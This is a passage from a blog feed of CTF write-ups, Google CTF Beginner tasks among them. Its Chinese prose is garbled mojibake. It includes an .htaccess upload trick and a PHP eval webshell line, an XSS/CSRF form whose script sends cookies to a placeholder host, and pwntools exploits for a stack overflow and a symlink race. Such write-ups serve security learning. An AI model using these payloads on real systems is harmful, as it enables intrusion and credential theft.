äº†ï¼Œæ‰€ä»¥è¿™é‡Œå°±åªèƒ½ç›´æ¥ç”¨writeupä¸­çš„ç”¨æˆ·åå¯†ç ç™»åå°äº†ã€‚</p><p>åå°æœ‰ä¸ªç®€å•çš„æ–‡ä»¶ä¸Šä¼ ï¼Œç„¶ååç¼€æœ‰é™åˆ¶åªèƒ½æ˜¯å›¾ç‰‡åç¼€ï¼Œè¿™é‡Œä¸Šä¼ ä¹‹åæ²¡æœ‰è·¯å¾„ï¼Œä½†æ˜¯æˆ‘ä»¬æœ‰æ•°æ®åº“çš„æ•°æ®ï¼Œæ ¹æ®æ•°æ®åº“ä¸­çš„æ•°æ®æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸Šä¼ åæ–‡ä»¶çš„æ–‡ä»¶åå†åŠ ä¸Šimgè·¯å¾„å°±å¯ä»¥çŸ¥é“æ–‡ä»¶çš„è·¯å¾„ã€‚å†çœ‹çœ‹ä¸Šä¼ çš„ç±»å‹ä¸­è¿˜æœ‰htaccesssï¼Œè¿™é‡Œå°±æ˜¯æ–‡ä»¶ä¸Šä¼ çš„æ¼æ´åˆ©ç”¨ã€‚</p><p>é€šè¿‡ä¸Šä¼ htaccessæ–‡ä»¶æ¥è®©ä¸€äº›åç¼€å¾—åˆ°è§£æã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;abc&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>æœ€åä¸Šä¼ .abcä¸ºåç¼€çš„webshellå³å¯</p><img src="/2018/08/01/dianfengjikeCTF-web/6.png"><h2 id="pentest"><a href="#pentest" class="headerlink" title="pentest"></a>pentest</h2><p>ç½‘ç«™ä½¿ç”¨metinfoæ¨¡æ¿ï¼Œåœ¨ç½‘ä¸Šæœç´¢ä¸€ç•ªï¼Œçœ‹åˆ°äº†å‡ ä¸ªSQlæ³¨å…¥çš„æ´ï¼Œè¯•äº†è¯•éƒ½ä¸è¡Œï¼Œç´¢æ€§æ”¾å¼ƒï¼Œçœ‹writeupã€‚</p><p>æ‰«æç›®å½•æ‰«å‡ºfile/file.phpï¼Œèƒ½åˆ é™¤æ–‡ä»¶ï¼Œç„¶åæ²¡æœ‰å¯¹..è¿‡æ»¤å¯¼è‡´å¯ä»¥è·¨ç›®å½•åˆ é™¤æ–‡ä»¶â€¦â€¦ emmmm çœ‹æ¥æ˜¯ä¸ºäº†æ¯”èµ›é¢å¤–æ·»åŠ äº†ä¸€ä¸ªæ–‡ä»¶åˆ é™¤ï¼Œè¿™ä¸ªå¦‚æœå­—å…¸æ²¡æ‰«å‡ºæ¥å°±æ ¹æœ¬æ— æ³•ä¸‹æ‰‹äº†ã€‚</p><p>åˆ é™¤æ–‡ä»¶çš„è·¯å¾„ä¸­æœ‰å¯¹<code>./</code>çš„è¿‡æ»¤ï¼Œæ‰€ä»¥æœ€ååˆ é™¤çš„è·¯å¾„ä¸º<code>...//xxxx/xxx</code><br>æ‰«åˆ°è¿™ä¸ªä¹‹åï¼Œåœ¨ä¹‹å‰çš„metinfoæ¼æ´é‡Œé¢æœ‰è®²åˆ é™¤install.lockæ–‡ä»¶ï¼Œå¯¼è‡´é‡è£…çš„é—®é¢˜ï¼Œå†åŠ ä¸Šmetinfoå¯¹æ•°æ®åº“å‚æ•°è¿‡æ»¤ä¸ä¸¥çš„é—®é¢˜ï¼Œåªè¦æ•°æ®åº“é…ç½®å‚æ•°ä¸­ä»»æ„ä¸€é¡¹å¡«å…¥ä¸€å¥è¯æœ¨é©¬<code>#*/@eval($_REQUEST[xxx]);/*</code>ï¼Œå°±å¯ä»¥æˆåŠŸgetshellã€‚</p><img src="/2018/08/01/dianfengjikeCTF-web/7.png"><p>è™½ç„¶å®‰è£…æ­¥éª¤æ²¡æœ‰èµ°å®Œï¼Œä½†æ˜¯åªè¦æ•°æ®åº“åˆ›å»ºæˆåŠŸï¼Œå°±å¯ä»¥é€šè¿‡config/config_db.phpæ‹¿shell</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://url.cn/5HWdbfS" target="_blank" rel="noopener">http://url.cn/5HWdbfS</a></p><p><a href="https://mp.weixin.qq.com/s/DYnLhYpC2eASyouk1YA2zg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/DYnLhYpC2eASyouk1YA2zg</a></p><p><a href="https://xz.aliyun.com/t/2469" target="_blank" rel="noopener">https://xz.aliyun.com/t/2469</a></p><p><a href="https://www.safeinfo.me/ldgb/75.html" target="_blank" rel="noopener">https://www.safeinfo.me/ldgb/75.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;å¤ç°äº†ä¸‰é“é¢˜ï¼Œå…¶ä»–çš„éƒ½å…³ç¯å¢ƒäº†ï¼Œè®°å½•ä¸€ä¸‹å¤ç°çš„è¿™ä¸‰é“å§ã€‚&lt;/p&gt;
&lt;h2 id=&quot;A-Simple-CMS&quot;&gt;&lt;a href=&quot;#A-Simple-CMS&quot; class=&quot;headerlink&quot; title=&quot;A Simple CMS&quot;&gt;&lt;/a&gt;A Simple CMS&lt;/
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Google CTF Beginner Part1</title>
    <link href="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/"/>
    <id>https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/</id>
    <published>2018-07-18T15:03:09.000Z</published>
    <updated>2018-07-19T01:15:59.326Z</updated>
    
    <content type="html"><![CDATA[<p>ä¼šé™†é™†ç»­ç»­çš„æŠŠGoogleCTFé¢˜ç›®çš„ç›¸å…³å¤ç°æ•´ç†å‡ºæ¥ï¼Œè¿™é‡Œå…ˆæ”¾ä¸€éƒ¨åˆ†ã€‚é€šè¿‡è¿™æ¬¡Beginnerè®­ç»ƒè¿˜æ˜¯äº†è§£åˆ°äº†è®¸å¤šä¹‹å‰æ²¡æ¥è§¦è¿‡çš„ï¼Œæ¯”å¦‚PWNé¢˜ä¸­çš„libcåœ°å€é—®é¢˜ã€‚</p><h2 id="LETTER-MISC"><a href="#LETTER-MISC" class="headerlink" title="LETTER(MISC)"></a>LETTER(MISC)</h2><p>åŸç†è¯´å‡ºæ¥éƒ½å¾ˆç®€å•ï¼Œè€ƒå¯Ÿçš„æ˜¯PDFä¸­è¡¨å±‚çš„è¦†ç›–å…¶å®è¿˜æ˜¯å¯è¯»çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰ä¸­éœ€è¦çš„å†…å®¹å¤åˆ¶ç²˜è´´å‡ºæ¥å°±å¯ä»¥äº†</p><img src="/2018/07/18/google-ctf-beginner-part1/1.png"><p>å¤åˆ¶ç²˜è´´å¤§æ³•</p><img src="/2018/07/18/google-ctf-beginner-part1/2.png"><h2 id="OCR-is-cool-MISC"><a href="#OCR-is-cool-MISC" class="headerlink" title="OCR is cool!(MISC)"></a>OCR is cool!(MISC)</h2><p>ä¸€é“é¢˜è€ƒå¯Ÿå›¾ç‰‡è½¬æ–‡å­—ä¹‹åï¼Œè¿ç”¨å¤å…¸åŠ å¯†è§£å†³é—®é¢˜ã€‚å­¦åˆ°æ–°çš„çŸ¥è¯†OCRï¼ŒPDFæˆ–è€…å›¾ç‰‡è½¬æ–‡æœ¬çš„æŠ€æœ¯ã€‚</p><p><a href="https://www.onlineocr.net/" target="_blank" rel="noopener">åœ¨çº¿è½¬æ¢é“¾æ¥</a></p><img src="/2018/07/18/google-ctf-beginner-part1/3.png"><p>ä¹‹ååœ¨å‡¯æ’’åŠ å¯†ä¸­ç ´è§£ï¼Œå› ä¸ºé¢˜ç›®ä¸­åŒ…å«ç€å‡¯æ’’ï¼Œæç¤ºä¹Ÿæ˜¯å¾ˆæ˜æ˜¾äº†ã€‚</p><img src="/2018/07/18/google-ctf-beginner-part1/4.png"><h2 id="MOAR-PWN"><a href="#MOAR-PWN" class="headerlink" title="MOAR(PWN)"></a>MOAR(PWN)</h2><p>è€ƒå¯Ÿäº†ä¸€ä¸ªç»†èŠ‚ç‚¹ï¼Œå½“æˆ‘ä»¬å¤„äºmanæ‰‹å†Œçš„çŠ¶æ€ä¸‹å¯ä»¥ä½¿ç”¨ !command çš„æ–¹å¼æ¥æ‰§è¡Œå‘½ä»¤</p><img src="/2018/07/18/google-ctf-beginner-part1/5.png"><p>æˆ‘ä»¬å°±ç›´æ¥lså‡ºhomeç›®å½•ä¸‹æœ‰ä¸œè¥¿ï¼Œç„¶åcatå‡ºæ¥å³å¯ã€‚</p><h2 id="Floppy-MISC"><a href="#Floppy-MISC" class="headerlink" title="Floppy(MISC)"></a>Floppy(MISC)</h2><p>ç»™äº†ä¸€ä¸ªå›¾æ ‡æ–‡ä»¶ï¼Œçœ‹äº†æ–‡æœ¬å†…å®¹æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œç„¶åå¼€å§‹ç”¨binwalkåˆ†æä¸€ä¸‹</p><img src="/2018/07/18/google-ctf-beginner-part1/6.png"><p>æœç„¶é‡Œé¢æœ‰ä¸œè¥¿ï¼Œæ”¹æˆzipè§£å‹å‡ºæ¥å°±okäº†</p><img src="/2018/07/18/google-ctf-beginner-part1/7.png"><h2 id="FLOPPY2-MISC"><a href="#FLOPPY2-MISC" class="headerlink" title="FLOPPY2(MISC)"></a>FLOPPY2(MISC)</h2><p>åœ¨ä¸Šä¸€é“é¢˜ç›®ä¸­ç•™ä¸‹äº†ä¸€ä¸ª <code>www.com</code> æ–‡ä»¶ï¼Œcomåç¼€æŸ¥äº†ä¸€ä¸‹æ˜¯MS-DOSçš„æ‰§è¡Œæ–‡ä»¶ï¼Œæ‰€ä»¥ç°åœ¨çš„windowsç³»ç»Ÿæ˜¯æ— æ³•æ‰§è¡Œçš„ï¼ŒDOSBOXå¯åŠ¨ï¼</p><p>ç›´æ¥è¿è¡Œå°±å‡ºç°ä¸€ä¸ªæ¯«æ— æ„ä¹‰çš„è¯ï¼Œæ²¡æœ‰ä»€ä¹ˆç»“æœä¹‹åæŠŠäºŒè¿›åˆ¶æ–‡ä»¶è½¬æˆæ–‡æœ¬çœ‹çœ‹å…¶ä¸­çš„å†…å®¹ï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆæ”¶è·â€¦â€¦</p><p>ç»è¿‡å…¶ä»–äººçš„Writeupä¹‹åå¾—çŸ¥è¦è°ƒè¯•è¿™ä¸ªç¨‹åºï¼Œåœ¨è°ƒè¯•ä¸­å‘ç°ï¼Œå®ƒä¼šå¯¹å…¶ä¸­çš„æŸä¸ªæ®µå–å‡ºå­—ç¬¦å¼‚æˆ–ç„¶åé‡å†™å›å»ï¼Œè¿™æ ·å°±å¥½åŠäº†ï¼Œä¸€ç›´è·Ÿè¸ªè°ƒè¯•ï¼Œæ¯æ¬¡ç»è¿‡ä¸€äº›é‡å†™æ“ä½œä¹‹åçœ‹çœ‹å†…å­˜ä¸­çš„æ•°æ®ã€‚æœ€åå¾—åˆ°flagã€‚</p><img src="/2018/07/18/google-ctf-beginner-part1/8.png"><h2 id="Security-By-Obsecurity-MISC"><a href="#Security-By-Obsecurity-MISC" class="headerlink" title="Security By Obsecurity(MISC)"></a>Security By Obsecurity(MISC)</h2><p>ä¸€é“å¾ˆçŒ¥ççš„é¢˜ç›®â€¦â€¦ é€šè¿‡fileå‘½ä»¤çŸ¥é“å¾—åˆ°çš„æ–‡ä»¶æ˜¯ä¸ªzipå‹ç¼©åŒ…ï¼Œç„¶åå°±å¼€å§‹äº†ï¼Œä¸€ç›´è§£å‹è§£å‹è§£å‹ã€‚ã€‚ã€‚</p><p>æœ€åæ‹¿åˆ°ä¸€ä¸ªpasswordçš„å‹ç¼©åŒ…é‡Œé¢æœ‰ä¸ªpassword.txtéœ€è¦å¯†ç ï¼Œçœ‹ä»–é¢˜ç›®ä¸­æœ‰æç¤ºjohnï¼Œæš—ç¤ºJohn The Ripperï¼Œè¿™ä¸ªæš´åŠ›ç ´è§£å·¥å…·ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å°±æš´åŠ›ä¸€ä¸‹å§ï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯ARCHPR</p><img src="/2018/07/18/google-ctf-beginner-part1/9.png"><p>å¾—åˆ°å¯†ç asdfï¼Œè§£å‹å¾—åˆ°password.txt</p><img src="/2018/07/18/google-ctf-beginner-part1/10.png"><p>æ‹¿åˆ°flag</p><h2 id="Router-UI-Web"><a href="#Router-UI-Web" class="headerlink" title="Router-UI(Web)"></a>Router-UI(Web)</h2><p>æ‰“å¼€ç½‘ç«™æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œè¾“å…¥è´¦å·å’Œå¯†ç ä¹‹åï¼Œå‘ç°ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œæ ¹æ®é¢˜ç›®çš„æç¤ºï¼ŒXSSæ— ç–‘ã€‚æˆ‘ä»¬è¾“å…¥scriptéªŒè¯æ¼æ´ï¼Œç»“æœè¢«chromeçš„auditoræ‹¦æˆªã€‚GGï¼Œè¿™é‡Œimgï¼Œsvgç­‰ç­‰æ ‡ç­¾å¤±å»ä½œç”¨ï¼Œå°±ç®—ç”¨src=javascript:alert(1) è¿™æ ·çš„å½¢å¼ä¹Ÿä¼šå˜æˆ500â€¦â€¦</p><p>æ— å¥ˆä¹‹å‰ï¼Œçœ‹äº†çœ‹åˆ«äººçš„writeupï¼Œå‘ç°å®ƒä»¬æ˜¯åˆ©ç”¨äº†é¡µé¢ä¸­çš„//åˆ†éš”ç¬¦ï¼ŒæŠŠscriptæ‹†æˆäº†ä¸¤ä¸ªéƒ¨åˆ†ï¼Œè¿™æ ·å°±ç»•è¿‡äº†auditorçš„æ£€æŸ¥ã€‚</p><p>é‚£ä¹ˆå¯ä»¥å¼•å…¥jsæ‰§è¡Œäº†ï¼Œæ€ä¹ˆå·ç®¡ç†å‘˜çš„cookieå‘¢ï¼Ÿå¿…é¡»è¦è®©ç®¡ç†å‘˜ç”¨è¿™æ ·çš„usernameå’Œpasswordç™»å½•æ‰è¡Œï¼Œæ‰€ä»¥å°±æ˜¯CSRFäº†ã€‚</p><p>ç»™ç®¡ç†å‘˜ä¸€ä¸ªå¯ä»¥è‡ªåŠ¨æäº¤çš„ç½‘ç«™ï¼Œæäº¤è¿™äº›å†…å®¹ï¼Œå°±ä¼šè§¦å‘jsæ‹¿åˆ°cookieã€‚ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">"https://router-ui.web.ctfcompetition.com/login?next=https%3A%2F%2Frouter-ui.web.ctfcompetition.com%2F"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"&lt;script src=https:"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"xxxxx/img/11.js&gt;&lt;/script&gt;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"b"</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"b"</span>).click();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨11.jsä¸­ï¼Œæ”¾å…¥å·cookieçš„è¯­å¥ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">"http://xxxxxx/?c="</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure><p>è¿™æ ·åœ¨æˆ‘ä»¬çš„æœåŠ¡å™¨çš„æ—¥å¿—ä¸­å°±å¯ä»¥çœ‹åˆ°å¸¦æœ‰cookieçš„è¯·æ±‚äº†ã€‚ä½†æ˜¯ç”±äºæ¯”èµ›å·²ç»ç»“æŸï¼Œä¼°è®¡æœºå™¨äººä¹Ÿæ²¡äº†ï¼Œæ‰€ä»¥åªèƒ½ç›´æ¥æŠ„wpä¸­çš„cookieè¿›å…¥åå°ã€‚</p><img src="/2018/07/18/google-ctf-beginner-part1/11.png"><p>æ·»åŠ cookieä¹‹åï¼Œé‡æ–°ç™»å½•å°±ä¼šè¿›å…¥æ§åˆ¶é¡µé¢äº†</p><img src="/2018/07/18/google-ctf-beginner-part1/12.png"><p>æœ€ååœ¨ç½‘é¡µä¸­æ‰¾åˆ°flag</p><p>åœ¨XSSçš„æ„é€ ä¸­åˆ©ç”¨//æ¥åŒ…å«é“¾æ¥æ¯”è¾ƒæœ‰æ„æ€ï¼Œå…¶ä»–çš„å°±æ˜¯ä¸­è§„ä¸­çŸ©çš„CSRF+XSSçš„è¿é”ã€‚</p><h2 id="Message-of-the-day-PWN"><a href="#Message-of-the-day-PWN" class="headerlink" title="Message of the day(PWN)"></a>Message of the day(PWN)</h2><p>å…ˆæŒ‰ç…§å›½é™…æƒ¯ä¾‹æ£€æŸ¥ä¸€ä¸‹ç¨‹åºçš„å®‰å…¨ä¿æŠ¤ã€‚</p><img src="/2018/07/18/google-ctf-beginner-part1/13.png"><p>å¼€å¯äº†NXæ„å‘³ç€æ— æ³•åœ¨å†…å­˜ä¸­æ— æ³•æ‰§è¡Œä»£ç ï¼Œæ‰€ä»¥è¿™é‡Œå°±æ²¡æœ‰åŠæ³•å†™shellcodeæ‰§è¡Œæ‹¿æƒé™ã€‚åˆ†æä¹‹åå‘ç°è¾“å…¥ç‚¹å¤„æœ‰ä¸å®‰å…¨çš„getså‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æ˜¯å¯ä»¥æ ˆæº¢å‡ºçš„ã€‚</p><img src="/2018/07/18/google-ctf-beginner-part1/14.png"><p>ä½†æ˜¯ï¼Œæ²¡æœ‰åŠæ³•å†™shellcodeï¼Œé‚£ä¹ˆè¿˜æœ‰ä»€ä¹ˆåŠæ³•å¯ä»¥æ‹¿åˆ°flagå‘¢ï¼Œåœ¨åˆ†æç¨‹åºæ—¶çœ‹åˆ°åœ¨é€‰é¡¹4ä¸­ä¼šæœ‰è¯»å–flagçš„æ“ä½œï¼Œå¿…é¡»æ˜¯ç®¡ç†å‘˜æ‰èƒ½æ‰§è¡Œã€‚</p><p>æ—¢ç„¶æ— æ³•å†™shellcodeï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦†ç›–è¿”å›åœ°å€ç”¨ret2libcçš„æ€è·¯å»æ‹¿flagï¼Œåº”è¯¥æ˜¯è¡Œçš„ï¼Œæˆ‘ä»¬çŸ¥é“è¯»å–flagçš„å‡½æ•°åœ°å€ï¼Œåªè¦æŠŠè¿”å›åœ°å€è¦†ç›–æˆè¿™ä¸ªåœ°å€å³å¯ã€‚</p><p>srcæ˜¯ä¸€ä¸ª0x100çš„æ ˆï¼Œè¦æ ˆæº¢å‡ºçš„è¯å°±è¦padding A*(0x100 + SPå¯„å­˜å™¨çš„å¤§å°)</p><img src="/2018/07/18/google-ctf-beginner-part1/15.png"><p>å‘ç°æ˜¯RSP64ä½å¯„å­˜å™¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬æœ€åçš„paddingå°±æ˜¯ A*(0x100+8)ï¼Œåœ°å€æˆ‘ä»¬ä¹ŸæŸ¥åˆ°äº†æ˜¯ 00000000606063A5ï¼Œæ‰€ä»¥æœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"motd.competition.com"</span>, <span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"2\n"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">0x108</span> + <span class="string">"\xA5\x63\x60\x60\x00\x00\x00\x00"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¸€ä¸‹ï¼Œæ‹¿åˆ°flag</p><img src="/2018/07/18/google-ctf-beginner-part1/16.png"><h2 id="Poetry-PWN"><a href="#Poetry-PWN" class="headerlink" title="Poetry(PWN)"></a>Poetry(PWN)</h2><p>æœ‰è¶£çš„ä¸€é“é¢˜ï¼Œå¼€å¯äº†æ ˆä¿æŠ¤ï¼Œæ‰€ä»¥æ ˆæº¢å‡ºæ˜¯ä¸å­˜åœ¨äº†ã€‚é‚£ä¹ˆçœ‹çœ‹IDAä¸­çš„å†…å®¹ã€‚</p><img src="/2018/07/18/google-ctf-beginner-part1/17.png"><p>å…¶ä¸­çš„LD_BIND_NOW åœ¨ç½‘ä¸ŠæŸ¥å‡ºæ¥çš„ç»“æœï¼Œå½“è¿™ä¸ªå˜é‡è®¾ç½®ä¸º1çš„æ—¶å€™ï¼Œä¼šè®©è¿æ¥å™¨åœ¨ç¨‹åºæ‰§è¡Œå‰æŠŠæ‰€æœ‰çš„å‡½æ•°åœ°å€éƒ½è¿æ¥å¥½ã€‚</p><p>ç„¶åä¼šç”¨readlinkè¯»å– /proc/self/exe å°±å¯ä»¥è·å–å½“å‰ç¨‹åºçš„ç»å¯¹è·¯å¾„ï¼Œä¹‹åè®¾ç½® LD_BIND_NOWä¸º1ï¼Œå†æ¬¡æ‰§è¡Œè¯¥ç¨‹åºã€‚</p><p>è¿™é‡Œæœ‰ä¸ªtrickï¼Œå°±æ˜¯å¦‚æœåœ¨ç¨‹åºæ‰§è¡Œreadlink(/proc/self/exe )çš„æ—¶å€™æ”¹å˜æºç¨‹åºï¼Œé‚£ä¹ˆreadlinkå¾—åˆ°çš„å†…å®¹å°±ä¼šå˜æˆ åŸè·¯å¾„+â€ (deleted)â€</p><p>æ‰€ä»¥åªè¦æˆ‘ä»¬åœ¨ç¨‹åºè¿è¡Œæ—¶å¯¹å®ƒåšæ”¹åŠ¨ï¼Œå®ƒçš„readlinkå°±ä¼šæ˜¯å¦å¤–ä¸€ä¸ªåç§°ï¼Œç„¶ååˆ©ç”¨æ–°çš„åç§°æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤ã€‚</p><p>ç”±äºæˆ‘ä»¬çš„flagåœ¨å…¶ä»–ç”¨æˆ·çš„ç›®å½•ä¸­ï¼Œæˆ‘ä»¬æ— æ³•è¯»å–ï¼Œæ‰€ä»¥æ€è·¯å°±æ˜¯æ”¹åŠ¨ç¨‹åºè®©å®ƒæ‰§è¡Œæˆ‘ä»¬æ§åˆ¶å¥½çš„å…¶ä»–ç¨‹åºè¯»å–flagï¼Œæˆ‘ä»¬æ˜¯æ²¡æœ‰æƒé™çš„ï¼Œä½†æ˜¯poetryæœ‰è¿™ä¸ªæƒé™ã€‚</p><p>è¿™é‡Œï¼Œæˆ‘ä»¬å…ˆç”¨lné“¾æ¥ poetryï¼Œå¾—åˆ°ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±çš„poetryï¼Œéšåln -s ç¡¬é“¾æ¥cat å‘½åä¸º poetry(deleted)ï¼Œè¿™æ ·æˆ‘ä»¬åœ¨æ‰§è¡Œæˆ‘ä»¬é“¾æ¥çš„poetry flagï¼Œç„¶ååˆ é™¤æˆ‘ä»¬çš„é“¾æ¥ç¨‹åºï¼Œå°±ä¼šè§¦å‘cat è¯»å–flagï¼Œæ•´ä¸ªè¿‡ç¨‹éƒ½æ˜¯poetryç”¨æˆ·çš„æƒé™ï¼Œæ‰€ä»¥æ²¡é—®é¢˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"poetry.ctfcompetition.com"</span>,<span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">"ln -s /bin/cat '/home/user/poetry (deleted)'\n"</span>)</span><br><span class="line">r.send(<span class="string">"ln /home/poetry/poetry /home/user/poetry\n"</span>)</span><br><span class="line">r.send(<span class="string">"(/home/user/poetry /home/poetry/flag &amp;);rm /home/user/poetry\n"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>æœ€åè¿™ä¸ªè„šæœ¬è¦å¤šè·‘å‡ æ¬¡ï¼Œå› ä¸ºè¿™ä¸ªæ˜¯æ¡ä»¶ç«äº‰çš„æ¼æ´ï¼Œæœ€åé€šè¿‡è¿™ä¸ªflagäº†è§£åˆ°CVE-2009-1894ï¼Œè¿™ä¸ªæ´çš„è§¦å‘æ¡ä»¶å°±æ˜¯åœ¨æˆ‘ä»¬æ‰§è¡Œç¨‹åºçš„æ—¶å€™ï¼Œæ­£å¥½åˆ é™¤äº†åŸå§‹é“¾æ¥ç¨‹åºï¼Œç„¶åä½¿å¾—readlinkè¿”å›æˆ‘ä»¬ä¼ªé€ çš„ç¨‹åºè·¯å¾„ä»è€Œæ‰§è¡Œæ¶æ„æ“ä½œã€‚</p><img src="/2018/07/18/google-ctf-beginner-part1/18.png"><p>æ‹¿åˆ°flag CVEé“¾æ¥ <code>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1894</code></p><h2 id="Fridge-ToDo-List-PWN"><a href="#Fridge-ToDo-List-PWN" class="headerlink" title="Fridge ToDo List(PWN)"></a>Fridge ToDo List(PWN)</h2><p>å¼€å¯äº†PIEï¼Œæ— æ³•åœ¨å†…å­˜ä¸­ç¡®å®šå…·ä½“çš„åœ°å€äº†ã€‚ç°åœ¨å…ˆçœ‹çœ‹ç¨‹åºæœ‰ä»€ä¹ˆåŠŸèƒ½ï¼Œ1-6ä¸ªé€‰é¡¹ã€‚</p><ol><li>æ‰“å°åˆ—è¡¨</li><li>æ‰“å°ToDoçš„ä»»åŠ¡</li><li>å­˜å‚¨ToDoä»»åŠ¡</li><li>åˆ é™¤ToDoä»»åŠ¡</li><li>è¿œç¨‹ç®¡ç†å‘˜</li><li>é€€å‡º</li></ol><p>é¦–å…ˆç¬¬ä¸€ä¸ªé€‰é¡¹ï¼Œå°±ä»…ä»…æ˜¯æ‰“å°ï¼Œæ²¡ä»€ä¹ˆè¾“å…¥ï¼Œæ”¾å¼ƒã€‚</p><p>ç¬¬äºŒä¸ªç¬¬ä¸‰ä¸ªç¬¬å››ä¸ªä¼šæœ‰ç¼–å·è¾“å…¥ï¼Œç¬¬äºŒä¸ªæœ‰è¯»æ“ä½œï¼Œç¬¬ä¸‰ä¸ªæœ‰å†™æ“ä½œï¼Œæ‰€ä»¥é‡ç‚¹å°±æ˜¯è¿™ä¸¤ä¸ªã€‚</p><p>ç¬¬äº”ä¸ªæŸ¥çœ‹æºç å°±çŸ¥é“åªæ˜¯ä¸€ä¸ªå¹Œå­ã€‚</p><p>ç¬¬å…­ä¸ªæ²¡å•¥å¥½è¯´çš„ï¼Œé€€å‡ºæ“ä½œã€‚</p><p>çœ‹åˆ°ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªæ“ä½œä¸­éƒ½æœ‰åŒæ ·çš„ä»£ç </p><img src="/2018/07/18/google-ctf-beginner-part1/19.png"><p>è¿™é‡Œåªæ£€æŸ¥äº†æ˜¯å¦å¤§äºæœ€å¤§æ•°é‡ï¼Œå¹¶æ²¡æœ‰é™åˆ¶æ˜¯å¦å°äº0,ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¶Šç•Œè¯»å’Œå†™ã€‚</p><p>é€šè¿‡IDAæˆ‘ä»¬åˆ†æçœ‹åˆ° todoä»0x203140å¼€å§‹ï¼Œé—´éš”ä¸º0x30ï¼Œé‚£ä¹ˆå¾€ä¸Šé¢çœ‹çœ‹æœ‰ä»€ä¹ˆå¯ä»¥è¯»å†™çš„ã€‚</p><img 